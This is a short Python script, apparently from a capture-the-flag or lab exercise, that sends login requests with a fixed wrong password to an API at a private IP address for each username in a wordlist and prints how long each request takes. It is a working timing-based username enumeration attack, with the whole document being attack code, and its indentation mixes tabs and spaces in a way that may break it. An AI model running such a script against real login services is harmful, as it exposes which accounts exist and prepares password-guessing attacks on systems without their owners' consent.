#!/usr/bin/env python

import requests
import time

URL="http://10.10.254.162/api/user/login"


def doLogin(username):
	creds = {"username":username,"password":"invalidPassword!"}
	response = requests.post(URL,json=creds)


with open('names2.txt','r') as f:
	data=f.read().rstrip().split()
	for user in data:
		users=user.rstrip()
		
		startTime = time.time()
	 	doLogin(users)
	 	endTime = time.time()
		print(users+" has login time of "+str(endTime-startTime))